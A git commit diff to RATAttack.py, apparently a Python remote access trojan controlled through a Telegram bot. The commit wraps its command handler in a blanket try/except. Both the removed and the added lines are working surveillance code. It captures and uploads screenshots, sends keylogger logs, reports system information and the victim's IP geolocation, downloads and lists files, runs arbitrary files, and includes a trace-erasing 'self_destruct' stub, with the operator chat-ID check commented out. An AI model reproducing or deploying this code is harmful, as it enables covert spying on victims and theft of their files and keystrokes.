240fb677eecabaa45fd77d4cf966371327f84e8e
Ritiek Malhotra <Ritiek@users.noreply.github.com>
2017-04-13 22:39:43 +0530

    Catch exceptions

--- RATAttack.py
+++ RATAttack.py
@@ -39,92 +39,94 @@ def handle(msg):
 	print command
 	print msg
 
-	#if checkchat_id(ID):
-
-		if command == '/capture_pc':
-			bot.sendChatAction(chat_id, 'typing')
-			screenshot = ImageGrab.grab()
-			screenshot.save('screenshot.jpg')
-			bot.sendChatAction(chat_id, 'upload_photo')
-			bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
-			os.remove('screenshot.jpg')
-
-		elif command == '/keylogs':
-			bot.sendChatAction(chat_id, 'upload_document')
-			bot.sendDocument(chat_id, open(log_file, "rb"))
-
-		elif command == '/pc_info':
-			bot.sendChatAction(chat_id, 'typing')
-			info = ''
-			for pc_info in platform.uname():
-				info += '\n' + pc_info
-			bot.sendMessage(chat_id, info)
-
-		elif command.startswith('/msg_box '):
-			message = command.replace('/msg_box ', '')
-			if message == '':
-				bot.sendMessage(chat_id, '/msg_box yourText')
-			else:
-				ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
-				bot.sendMessage(chat_id, 'MsgBox Displayed')
-
-		elif command == '/ip_info':
-			bot.sendChatAction(chat_id, 'find_location')
-			info = requests.get('http://ipinfo.io').text
-			bot.sendMessage(chat_id, info)
-			location = (json.loads(info)['loc']).split(',')
-			bot.sendLocation(chat_id, location[0], location[1])
-
-		elif command.startswith('/download_file'):
-			path = command.replace('/download_file', '')
-			path = path[1:]
-			if path == '':
+	try:
+		#if checkchat_id(ID):
+			if command == '/capture_pc':
 				bot.sendChatAction(chat_id, 'typing')
-				bot.sendMessage(chat_id, '/download_file C:/path/to/file')
-			else:
-				try:
-					bot.sendChatAction(chat_id, 'upload_document')
-					bot.sendDocument(chat_id, open(path, 'rb'))
-				except:
-					bot.sendMessage(chat_id, 'Could not find file')
+				screenshot = ImageGrab.grab()
+				screenshot.save('screenshot.jpg')
+				bot.sendChatAction(chat_id, 'upload_photo')
+				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
+				os.remove('screenshot.jpg')
 
-		elif command.startswith('/list_dir'):
-			bot.sendChatAction(chat_id, 'typing')
-			path = command.replace('/list_dir', '')
-			path = path[1:]
-			if path == '':
-				bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
-			else:
-				try:
-					files = os.listdir(path)
-					human_readable = ''
-					for file in files:
-						human_readable += file + '\n'
-					human_readable += human_readable + '\n^Contents of ' + path
-					bot.sendMessage(chat_id, human_readable)
-				except:
-					bot.sendMessage(chat_id, 'Invalid path')
+			elif command == '/keylogs':
+				bot.sendChatAction(chat_id, 'upload_document')
+				bot.sendDocument(chat_id, open(log_file, "rb"))
 
-		elif command.startswith('/run_file'):
-			bot.sendChatAction(chat_id, 'typing')
-			path = command.replace('/run_file', '')
-			path = path[1:]
-			if path == '':
-				bot.sendMessage(chat_id, '/run_file C:/path/to/file')
-			else:
-				os.startfile(path)
-				bot.sendMessage(chat_id, 'Command executed')
+			elif command == '/pc_info':
+				bot.sendChatAction(chat_id, 'typing')
+				info = ''
+				for pc_info in platform.uname():
+					info += '\n' + pc_info
+				bot.sendMessage(chat_id, info)
 
-		elif command == '/self_destruct':
-			bot.sendChatAction(chat_id, 'typing')
-			global initi
-			initi = True
-			bot.sendMessage(chat_id, "You sure? Type 'DESTROYNOW!' to proceed.")
+			elif command.startswith('/msg_box '):
+				message = command.replace('/msg_box ', '')
+				if message == '':
+					bot.sendMessage(chat_id, '/msg_box yourText')
+				else:
+					ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
+					bot.sendMessage(chat_id, 'MsgBox Displayed')
 
-		elif command == 'DESTROYNOW!' and initi == True:
-			bot.sendChatAction(chat_id, 'typing')
-			bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
-			# self_destruct
+			elif command == '/ip_info':
+				bot.sendChatAction(chat_id, 'find_location')
+				info = requests.get('http://ipinfo.io').text
+				bot.sendMessage(chat_id, info)
+				location = (json.loads(info)['loc']).split(',')
+				bot.sendLocation(chat_id, location[0], location[1])
+
+			elif command.startswith('/download_file'):
+				path = command.replace('/download_file', '')
+				path = path[1:]
+				if path == '':
+					bot.sendChatAction(chat_id, 'typing')
+					bot.sendMessage(chat_id, '/download_file C:/path/to/file')
+				else:
+					try:
+						bot.sendChatAction(chat_id, 'upload_document')
+						bot.sendDocument(chat_id, open(path, 'rb'))
+					except:
+						bot.sendMessage(chat_id, 'Could not find file')
+
+			elif command.startswith('/list_dir'):
+				bot.sendChatAction(chat_id, 'typing')
+				path = command.replace('/list_dir', '')
+				path = path[1:]
+				if path == '':
+					bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
+				else:
+					try:
+						files = os.listdir(path)
+						human_readable = ''
+						for file in files:
+							human_readable += file + '\n'
+						human_readable += human_readable + '\n^Contents of ' + path
+						bot.sendMessage(chat_id, human_readable)
+					except:
+						bot.sendMessage(chat_id, 'Invalid path')
+
+			elif command.startswith('/run_file'):
+				bot.sendChatAction(chat_id, 'typing')
+				path = command.replace('/run_file', '')
+				path = path[1:]
+				if path == '':
+					bot.sendMessage(chat_id, '/run_file C:/path/to/file')
+				else:
+					os.startfile(path)
+					bot.sendMessage(chat_id, 'Command executed')
+
+			elif command == '/self_destruct':
+				bot.sendChatAction(chat_id, 'typing')
+				global initi
+				initi = True
+				bot.sendMessage(chat_id, "You sure? Type 'DESTROYNOW!' to proceed.")
+
+			elif command == 'DESTROYNOW!' and initi == True:
+				bot.sendChatAction(chat_id, 'typing')
+				bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
+				# self_destruct
+	except:
+		pass
 
 def checkchat_id(ID):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
